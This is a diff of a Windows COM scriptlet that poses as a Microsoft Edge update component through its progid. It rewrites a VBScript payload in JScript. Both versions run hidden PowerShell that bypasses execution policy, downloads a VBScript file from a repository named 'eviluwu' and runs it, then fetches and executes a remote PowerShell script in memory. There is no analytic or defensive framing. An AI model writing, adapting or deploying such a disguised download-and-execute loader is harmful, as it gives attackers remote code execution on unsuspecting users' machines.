@@ -1,10 +1,10 @@
 <?xml version="1.0"?>
 <scriptlet>
 <registration progid="MicrosoftEdgeUpdateUpdaterTaskMachineCore" classid="{5C659079-6969-6767-88EF-726481711200}">
-<script language="VBScript">
+<script language="JScript">
 <![CDATA[
-    Set objShell = CreateObject("WScript.Shell")
-    objShell.Run "powershell.exe -W Hidden -EP Bypass -Command ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/HP.vbs' -OutFile $env:TEMP\HP.vbs; Start-Process wscript.exe -ArgumentList '//E:vbscript',$env:TEMP\HP.vbs; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/uwu.ps1')""", 0
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("powershell.exe -W Hidden -EP Bypass -Command \"$p=$env:TEMP+'\\HP.vbs'; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/HP.vbs' -OutFile $p; wscript.exe //E:vbscript $p; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/uwu.ps1')\"", 0);
 ]]>
 </script>
 </registration>
